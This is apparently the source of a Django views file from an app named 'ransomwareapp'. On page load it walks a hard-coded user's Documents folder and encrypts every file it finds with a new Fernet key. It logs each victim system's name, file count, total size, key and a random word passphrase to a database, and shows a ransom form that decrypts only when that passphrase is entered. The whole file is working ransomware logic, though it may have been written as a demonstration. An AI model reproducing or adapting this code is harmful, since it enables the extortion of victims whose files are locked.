from django.shortcuts import render
from ransomwareapp.forms import MyForm
from cryptography.fernet import Fernet
import os
from ransomwareapp.models import AttackData
import socket
import random
from ransomwareapp import decryptionfile, encryptionfile

# Replace 'your_directory_path' with the actual path to your directory
# print(os.getlogin())   
# directory_path = '/home/' + os.getlogin() + '/Documents/'
directory_path = '/home/' + 'sharan-rao' + '/Documents/'

Org_file_list=[]

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('0.0.0.0', 8080)
server_socket.bind(server_address)
server_socket.listen(1)
client_socket, client_address = server_socket.accept()
client_ip = client_address[0]
client_socket.close()
server_socket.close()

system_name = socket.gethostbyaddr(client_ip)



for root, dirs, files in os.walk(directory_path):
    for file in files:
        if 'lazarus' not in file.split('.'):
            file_path = os.path.join(root, file)
            Org_file_list.append(file_path)
            print("File:", file_path)

def popup_view(request):

    if request.method == 'POST':
        form = MyForm(request.POST)
        if form.is_valid():
            if AttackData.objects.get(SystemName=system_name).DecryptionPassword == form.cleaned_data['User_Entry_Password']:
                
                key = AttackData.objects.get(SystemName=system_name).EncryptionKey
                decryptionfile.decryption(key,directory_path,Org_file_list)
                
                return render(request , 'ransomware.html')

    
    key = Fernet.generate_key()
    filesize=encryptionfile.encryption(Org_file_list,key)
    
    form = MyForm()
    form.fields['System_Name'].widget.attrs['value'] = system_name


    if AttackData.objects.filter(SystemName = system_name).first():
        
        entry = AttackData.objects.get(SystemName=system_name)

        # Increment the integer fields
        entry.NumberOfFiles = entry.NumberOfFiles + len(Org_file_list)
        entry.TotalFilesSize = entry.TotalFilesSize + filesize
        entry.save()
        form.fields['Number_Of_Files_Encrypted'].widget.attrs['value'] = entry.NumberOfFiles
        form.fields['Volume_Of_Files'].widget.attrs['value'] = str(entry.TotalFilesSize) + 'bytes'
    
    else:
        with open('ransomwareapp/words.txt', 'r') as file:
            phrases = [line.strip() for line in file]
            random_phrase = f"{random.choice(phrases)} {random.choice(phrases)} {random.choice(phrases)}."

            print(random_phrase)
        AttackData.objects.create(SystemName = system_name,NumberOfFiles = len(Org_file_list),TotalFilesSize = filesize,EncryptionKey = key, DecryptionPassword = random_phrase)
        form.fields['Number_Of_Files_Encrypted'].widget.attrs['value'] = len(Org_file_list) 
        form.fields['Volume_Of_Files'].widget.attrs['value'] = str(filesize) + 'bytes'
 

    return render(request,'ransomware1.html',{'form': form})
